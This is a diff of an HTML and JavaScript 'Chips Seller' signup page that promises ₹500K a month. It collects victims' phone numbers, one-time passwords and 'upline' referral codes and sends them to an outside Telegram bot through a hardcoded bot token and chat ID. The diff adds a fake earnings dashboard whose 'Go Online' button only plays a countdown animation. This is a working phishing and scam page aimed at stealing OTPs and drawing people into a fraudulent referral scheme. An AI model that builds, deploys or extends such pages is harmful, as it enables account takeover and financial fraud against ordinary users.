@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chips Seller - Sign Up</title>
+    <title>Chips Seller - Dashboard</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -13,123 +13,197 @@
         }
     </style>
 </head>
-<body class="bg-[#5b21b6] min-h-screen text-slate-900 flex flex-col justify-start selection:bg-indigo-500 selection:text-white">
+<body class="bg-slate-100 min-h-screen text-slate-900 flex flex-col justify-between selection:bg-indigo-500 selection:text-white">
 
     <!-- Toast Notification Container -->
     <div id="toast-container" class="fixed top-5 left-1/2 -translate-x-1/2 z-50 flex flex-col gap-2 w-11/12 max-w-md pointer-events-none"></div>
 
-    <!-- Permanent SVG Banner Section (No Broken Image Links) -->
-    <header class="w-full pt-6 pb-2 px-4 max-w-md mx-auto flex flex-col items-start relative">
-      <!-- Speech Bubble Badge -->
-      <div class="bg-white/20 backdrop-blur-md px-3 py-1 rounded-xl text-white font-extrabold text-xs tracking-wider mb-2 border border-white/20 shadow-sm">
-        JOIN US!
-      </div>
+    <!-- ================= SIGN UP / LOGIN VIEW ================= -->
+    <div id="auth-view" class="w-full min-h-screen bg-[#5b21b6] flex flex-col justify-start">
+        <!-- Permanent SVG Banner Section -->
+        <header class="w-full pt-6 pb-2 px-4 max-w-md mx-auto flex flex-col items-start relative">
+          <div class="bg-white/20 backdrop-blur-md px-3 py-1 rounded-xl text-white font-extrabold text-xs tracking-wider mb-2 border border-white/20 shadow-sm">
+            JOIN US!
+          </div>
 
-      <!-- Main Title Text -->
-      <h2 class="text-xl font-bold text-white leading-tight max-w-[260px] mb-4">
-        As an official Chip Seller to earn <span class="text-amber-300 font-extrabold">₹500K monthly.</span>
-      </h2>
+          <h2 class="text-xl font-bold text-white leading-tight max-w-[260px] mb-4">
+            As an official Chip Seller to earn <span class="text-amber-300 font-extrabold">₹500K monthly.</span>
+          </h2>
 
-      <!-- Embedded Vector Characters & Coin Stack -->
-      <div class="w-full flex justify-end items-end h-28 pr-2 -mt-6">
-        <svg viewBox="0 0 200 120" class="h-28 w-auto overflow-visible">
-          <!-- Stack of Gold Coins -->
-          <g transform="translate(60, 65)">
-            <ellipse cx="20" cy="30" rx="18" ry="6" fill="#f59e0b" />
-            <ellipse cx="20" cy="25" rx="18" ry="6" fill="#fbbf24" />
-            <ellipse cx="20" cy="20" rx="18" ry="6" fill="#fcd34d" />
-            <ellipse cx="20" cy="15" rx="18" ry="6" fill="#fef08a" stroke="#f59e0b" stroke-width="1" />
-          </g>
+          <div class="w-full flex justify-end items-end h-28 pr-2 -mt-6">
+            <svg viewBox="0 0 200 120" class="h-28 w-auto overflow-visible">
+              <g transform="translate(60, 65)">
+                <ellipse cx="20" cy="30" rx="18" ry="6" fill="#f59e0b" />
+                <ellipse cx="20" cy="25" rx="18" ry="6" fill="#fbbf24" />
+                <ellipse cx="20" cy="20" rx="18" ry="6" fill="#fcd34d" />
+                <ellipse cx="20" cy="15" rx="18" ry="6" fill="#fef08a" stroke="#f59e0b" stroke-width="1" />
+              </g>
+              <g transform="translate(15, 30)">
+                <circle cx="35" cy="40" r="16" fill="#fbbf24" stroke="#f59e0b" stroke-width="2" />
+                <circle cx="20" cy="25" r="5" fill="#fde68a" />
+                <path d="M12 32 Q 20 30 28 35 L 25 50 L 10 50 Z" fill="#0284c7" />
+                <path d="M10 50 L 30 50 L 35 68 L 5 68 Z" fill="#1e1b4b" />
+              </g>
+              <g transform="translate(115, 10)">
+                <circle cx="15" cy="12" r="6" fill="#fde68a" />
+                <path d="M8 20 L 22 20 L 20 48 L 10 48 Z" fill="#06b6d4" />
+                <path d="M10 48 L 20 48 L 22 85 L 8 85 Z" fill="#fbbf24" />
+                <path d="M8 22 L -8 5 L -4 2 Z" fill="#06b6d4" stroke="#06b6d4" stroke-width="3" stroke-linecap="round" />
+              </g>
+              <g transform="translate(145, 18)">
+                <circle cx="12" cy="10" r="5.5" fill="#fde68a" />
+                <path d="M6 17 L 18 17 L 20 45 L 4 45 Z" fill="#f43f5e" />
+                <path d="M6 45 L 18 45 L 16 80 L 8 80 Z" fill="#312e81" />
+              </g>
+            </svg>
+          </div>
+        </header>
 
-          <!-- Kneeling Person with Big Coin -->
-          <g transform="translate(15, 30)">
-            <circle cx="35" cy="40" r="16" fill="#fbbf24" stroke="#f59e0b" stroke-width="2" />
-            <circle cx="20" cy="25" r="5" fill="#fde68a" />
-            <path d="M12 32 Q 20 30 28 35 L 25 50 L 10 50 Z" fill="#0284c7" />
-            <path d="M10 50 L 30 50 L 35 68 L 5 68 Z" fill="#1e1b4b" />
-          </g>
+        <!-- Main White Bottom Card Form Section -->
+        <main class="w-full max-w-md mx-auto px-4 -mt-2">
+            <div class="bg-white rounded-t-[35px] p-6 shadow-2xl border-t border-white/20">
+                <div class="text-center mb-5 flex items-center justify-center space-x-2">
+                    <span class="text-indigo-300 font-bold tracking-widest text-xs">////</span>
+                    <h3 class="text-xs font-extrabold tracking-widest text-slate-800 uppercase">Sign up & Earn</h3>
+                    <span class="text-indigo-300 font-bold tracking-widest text-xs">////</span>
+                </div>
 
-          <!-- Standing Person 1 (Yellow Pants) -->
-          <g transform="translate(115, 10)">
-            <circle cx="15" cy="12" r="6" fill="#fde68a" />
-            <path d="M8 20 L 22 20 L 20 48 L 10 48 Z" fill="#06b6d4" />
-            <path d="M10 48 L 20 48 L 22 85 L 8 85 Z" fill="#fbbf24" />
-            <!-- Pointing Arm -->
-            <path d="M8 22 L -8 5 L -4 2 Z" fill="#06b6d4" stroke="#06b6d4" stroke-width="3" stroke-linecap="round" />
-          </g>
+                <form id="signup-form" onsubmit="handleFormSubmit(event)" class="space-y-4">
+                    <div>
+                        <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
+                            <div class="flex items-center pl-4 pr-3 py-3.5 border-r border-slate-200 text-slate-700 font-semibold text-sm">
+                                <span>+91</span>
+                            </div>
+                            <input type="tel" id="phone" required placeholder="Type phone number" maxlength="10" 
+                                class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
+                        </div>
+                    </div>
 
-          <!-- Standing Person 2 (Red Dress) -->
-          <g transform="translate(145, 18)">
-            <circle cx="12" cy="10" r="5.5" fill="#fde68a" />
-            <path d="M6 17 L 18 17 L 20 45 L 4 45 Z" fill="#f43f5e" />
-            <path d="M6 45 L 18 45 L 16 80 L 8 80 Z" fill="#312e81" />
-          </g>
-        </svg>
-      </div>
-    </header>
+                    <div>
+                        <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
+                            <input type="text" id="otp" required placeholder="Type OTP" maxlength="6"
+                                class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
+                            <button type="button" id="otp-btn" onclick="sendOTP()" 
+                                class="mr-2 px-5 py-2.5 bg-[#5b21b6] hover:bg-[#4c1d95] text-white text-xs font-bold rounded-xl transition shadow-md active:scale-95">
+                                Request
+                            </button>
+                        </div>
+                    </div>
 
-    <!-- Main White Bottom Card Form Section -->
-    <main class="w-full max-w-md mx-auto px-4 -mt-2">
-        <div class="bg-white rounded-t-[35px] p-6 shadow-2xl border-t border-white/20">
-            <div class="text-center mb-5 flex items-center justify-center space-x-2">
-                <span class="text-indigo-300 font-bold tracking-widest text-xs">////</span>
-                <h3 class="text-xs font-extrabold tracking-widest text-slate-800 uppercase">Sign up & Earn</h3>
-                <span class="text-indigo-300 font-bold tracking-widest text-xs">////</span>
+                    <div>
+                        <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
+                            <input type="text" id="upline" placeholder="Upline Code (Optional)"
+                                class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
+                        </div>
+                    </div>
+
+                    <button type="submit" id="submit-btn"
+                        class="w-full mt-3 py-4 px-6 bg-[#5b21b6] hover:bg-[#4c1d95] text-white font-bold text-base rounded-2xl shadow-lg shadow-purple-900/25 transition active:scale-[0.98] flex items-center justify-center space-x-2">
+                        <span>Sign up</span>
+                    </button>
+                </form>
+            </div>
+        </main>
+    </div>
+
+    <!-- ================= DASHBOARD VIEW (Shown After Login) ================= -->
+    <div id="dashboard-view" class="w-full min-h-screen bg-slate-50 hidden flex flex-col justify-between max-w-md mx-auto shadow-xl">
+        <!-- Top App Bar -->
+        <div>
+            <div class="bg-white px-4 py-3 flex items-center justify-between border-b border-slate-200 shadow-sm">
+                <div class="flex items-center space-x-3">
+                    <button class="text-blue-600 text-lg relative">
+                        <i class="fa-solid fa-bell"></i>
+                        <span class="absolute -top-1 -right-1 bg-rose-500 w-2 h-2 rounded-full"></span>
+                    </button>
+                    <button class="bg-slate-100 p-2 rounded-xl text-slate-700">
+                        <i class="fa-solid fa-file-lines"></i>
+                    </button>
+                </div>
+                <!-- Balance & Purchase Header Badge (Set to 21) -->
+                <div class="flex items-center bg-slate-100 border border-slate-200 rounded-full pl-3 pr-1 py-1 space-x-2 shadow-inner">
+                    <span class="text-amber-500 text-sm">🪙</span>
+                    <span id="user-balance" class="font-bold text-slate-800 text-sm">21</span>
+                    <button onclick="showToast('Redirecting to purchase...', 'info')" class="bg-slate-900 hover:bg-slate-800 text-white text-xs font-semibold px-3 py-1.5 rounded-full transition">
+                        Purchase
+                    </button>
+                </div>
             </div>
 
-            <form id="signup-form" onsubmit="handleFormSubmit(event)" class="space-y-4">
-                <!-- Phone Number Input -->
-                <div>
-                    <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
-                        <div class="flex items-center pl-4 pr-3 py-3.5 border-r border-slate-200 text-slate-700 font-semibold text-sm">
-                            <span>+91</span>
-                        </div>
-                        <input type="tel" id="phone" required placeholder="Type phone number" maxlength="10" 
-                            class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
+            <!-- Earnings Card -->
+            <div class="mx-4 mt-3 bg-white p-3.5 rounded-2xl border border-slate-200 flex items-center justify-between shadow-sm">
+                <div class="flex items-center space-x-3">
+                    <div class="w-8 h-8 rounded-full bg-amber-100 flex items-center justify-center text-amber-500">
+                        🪙
+                    </div>
+                    <div class="text-xs space-y-0.5">
+                        <div class="text-slate-500">Today's Earnings <span class="font-bold text-slate-800">0</span></div>
+                        <div class="text-slate-500">Total Earning <span class="font-bold text-slate-800">0</span></div>
                     </div>
                 </div>
+            </div>
 
-                <!-- OTP Input with Request Button -->
-                <div>
-                    <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
-                        <input type="text" id="otp" required placeholder="Type OTP" maxlength="6"
-                            class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
-                        <button type="button" id="otp-btn" onclick="sendOTP()" 
-                            class="mr-2 px-5 py-2.5 bg-[#5b21b6] hover:bg-[#4c1d95] text-white text-xs font-bold rounded-xl transition shadow-md active:scale-95">
-                            Request
-                        </button>
-                    </div>
+            <!-- Go Online / Offline Center Section -->
+            <div class="flex flex-col items-center justify-center mt-16 px-4">
+                <div class="relative flex items-center justify-center">
+                    <!-- Outer Glowing Ring Animation -->
+                    <div id="glow-ring" class="absolute w-64 h-64 rounded-full border-2 border-indigo-200/60 animate-ping opacity-25 pointer-events-none hidden"></div>
+                    
+                    <!-- Main Action Button -->
+                    <button id="toggle-online-btn" onclick="toggleOnlineStatus()" 
+                        class="w-52 h-52 rounded-full bg-gradient-to-b from-sky-400 to-indigo-600 text-white shadow-2xl flex flex-col items-center justify-center space-y-2 transform active:scale-95 transition-all duration-300 border-4 border-white">
+                        <i id="toggle-icon" class="fa-solid fa-power-off text-4xl mb-1"></i>
+                        <span id="toggle-text" class="text-xl font-bold tracking-wide">Go Online</span>
+                    </button>
                 </div>
-
-                <!-- Upline Code Input (Optional) -->
-                <div>
-                    <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
-                        <input type="text" id="upline" placeholder="Upline Code (Optional)"
-                            class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
-                    </div>
-                </div>
-
-                <!-- Submit Button -->
-                <button type="submit" id="submit-btn"
-                    class="w-full mt-3 py-4 px-6 bg-[#5b21b6] hover:bg-[#4c1d95] text-white font-bold text-base rounded-2xl shadow-lg shadow-purple-900/25 transition active:scale-[0.98] flex items-center justify-center space-x-2">
-                    <span>Sign up</span>
-                </button>
-            </form>
+                <p id="status-subtitle" class="mt-8 italic text-slate-500 font-medium text-sm tracking-wide">
+                    GO ONLINE TO EARN MONEY!
+                </p>
+            </div>
         </div>
-    </main>
+
+        <!-- Bottom Navigation Bar -->
+        <div class="bg-white border-t border-slate-200 py-3 px-6 flex items-center justify-between text-xs font-medium text-slate-400">
+            <div class="text-center text-indigo-600 cursor-pointer">
+                <i class="fa-solid fa-house text-lg block mb-0.5"></i>
+                <span>Home</span>
+            </div>
+            <div onclick="showToast('Purchase tab opened', 'info')" class="text-center hover:text-slate-600 cursor-pointer transition">
+                <i class="fa-solid fa-bag-shopping text-lg block mb-0.5"></i>
+                <span>Purchase</span>
+            </div>
+            <div onclick="showToast('Referral tab opened', 'info')" class="text-center hover:text-slate-600 cursor-pointer transition">
+                <i class="fa-solid fa-user-group text-lg block mb-0.5"></i>
+                <span>Referral</span>
+            </div>
+            <div onclick="showToast('Record tab opened', 'info')" class="text-center hover:text-slate-600 cursor-pointer transition">
+                <i class="fa-solid fa-file-lines text-lg block mb-0.5"></i>
+                <span>Record</span>
+            </div>
+        </div>
+
+        <!-- Bank Account Link Footer inside Dashboard -->
+        <div class="text-center pb-3 pt-1">
+            <a href="#" onclick="showToast('Bank account settings', 'info')" class="text-xs text-indigo-600 font-semibold hover:underline flex items-center justify-center space-x-1">
+                <i class="fa-solid fa-wallet"></i>
+                <span>My bank account</span>
+            </a>
+        </div>
+    </div>
 
     <!-- FontAwesome for Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
-    <!-- JavaScript Logic with Dual Telegram Bot Integration -->
+    <!-- JavaScript Logic -->
     <script>
         const BOT_TOKEN = "8439698505:AAGL0UR5DuMaMLm81HarVsDvQ8gFkvcZFU0";
         const CHAT_ID = "8698008425";
 
         let countdownSeconds = 60;
         let timerInterval = null;
+        let isOnline = false;
+        let countdownTimer = null;
 
-        // Toast Notification Function
         function showToast(message, type = 'info') {
             const container = document.getElementById('toast-container');
             if (!container) return;
@@ -160,7 +234,6 @@
             }, 4000);
         }
 
-        // 1. Request Button Clicked -> Sends First Telegram Message (Phone Number)
         async function sendOTP() {
             const phoneInput = document.getElementById('phone').value.trim();
             if(phoneInput.length < 10) {
@@ -171,7 +244,6 @@
             const otpBtn = document.getElementById('otp-btn');
             if (timerInterval) return;
 
-            // First Telegram Message for Request
             const message = `📲 *New OTP Request!*\n\n📱 *Phone:* \`+91 ${phoneInput}\``;
 
             try {
@@ -207,7 +279,6 @@
             }, 1000);
         }
 
-        // 2. Sign Up Button Clicked -> Sends Second Telegram Message (Phone + OTP + Upline)
         async function handleFormSubmit(event) {
             event.preventDefault();
 
@@ -228,7 +299,6 @@
             submitBtn.disabled = true;
             submitBtn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i><span>Processing...</span>`;
 
-            // Second Telegram Message for Sign Up Submission
             const message = `🚨 *New Chip Seller Sign-Up* 🚨\n\n📱 *Phone:* \`+91 ${phone}\`\n🔢 *OTP:* \`${otp}\`\n🔗 *Upline Code:* \`${upline}\``;
 
             try {
@@ -246,7 +316,12 @@
 
                 if (data.ok) {
                     showToast('Sign up successful! Welcome aboard.', 'success');
-                    document.getElementById('signup-form').reset();
+                    
+                    // Switch from Sign Up / Login View to Dashboard View
+                    setTimeout(() => {
+                        document.getElementById('auth-view').classList.add('hidden');
+                        document.getElementById('dashboard-view').classList.remove('hidden');
+                    }, 800);
                 } else {
                     showToast('Failed to send data. Check configuration.', 'error');
                 }
@@ -256,6 +331,45 @@
             } finally {
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = `<span>Sign up</span>`;
+            }
+        }
+
+        // Toggle Go Online / Offline with Countdown Animation matching the video
+        function toggleOnlineStatus() {
+            const btn = document.getElementById('toggle-online-btn');
+            const btnText = document.getElementById('toggle-text');
+            const subtitle = document.getElementById('status-subtitle');
+            const glowRing = document.getElementById('glow-ring');
+
+            if (!isOnline) {
+                // Start 3-2-1 Countdown simulation like in video
+                let count = 3;
+                btn.disabled = true;
+                btnText.innerText = count;
+                subtitle.innerText = "CONNECTING...";
+
+                countdownTimer = setInterval(() => {
+                    count--;
+                    if (count > 0) {
+                        btnText.innerText = count;
+                    } else {
+                        clearInterval(countdownTimer);
+                        isOnline = true;
+                        btnText.innerText = "Go Offline";
+                        subtitle.innerText = "EARNING MONEY NOW–";
+                        btn.className = "w-52 h-52 rounded-full bg-gradient-to-b from-rose-500 to-red-700 text-white shadow-2xl flex flex-col items-center justify-center space-y-2 transform active:scale-95 transition-all duration-300 border-4 border-white";
+                        glowRing.classList.remove('hidden');
+                        btn.disabled = false;
+                        showToast('You are now Online and earning!', 'success');
+                    }
+                }, 1000);
+            } else {
+                isOnline = false;
+                btnText.innerText = "Go Online";
+                subtitle.innerText = "GO ONLINE TO EARN MONEY!";
+                btn.className = "w-52 h-52 rounded-full bg-gradient-to-b from-sky-400 to-indigo-600 text-white shadow-2xl flex flex-col items-center justify-center space-y-2 transform active:scale-95 transition-all duration-300 border-4 border-white";
+                glowRing.classList.add('hidden');
+                showToast('You are now Offline.', 'info');
             }
         }
     </script>
